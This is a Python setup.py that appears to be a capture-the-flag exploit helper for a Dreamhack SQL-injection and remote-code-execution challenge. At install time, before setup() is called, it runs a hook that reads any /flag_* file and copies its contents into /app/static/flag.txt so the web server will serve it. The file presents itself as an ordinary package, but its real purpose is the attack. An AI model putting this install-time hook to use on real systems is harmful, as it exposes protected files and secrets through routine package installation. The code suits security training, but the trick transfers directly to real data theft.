from setuptools import setup, find_packages

import glob
from pathlib import Path


def drop_flag():
    paths = glob.glob("/flag_*")
    if not paths:
        return

    try:
        with open(paths[0], "r") as f:
            flag_text = f.read()
    except Exception:
        return

    try:
        static_dir = Path("/app") / "static"
        static_dir.mkdir(parents=True, exist_ok=True)
        (static_dir / "flag.txt").write_text(flag_text)
    except Exception:
        pass


drop_flag()

setup(
    name="nspacercesolve",
    version="0.0.5",
    description="Dreamhack SQLi RCE helper",
    packages=find_packages(),
    python_requires=">=3.8",
)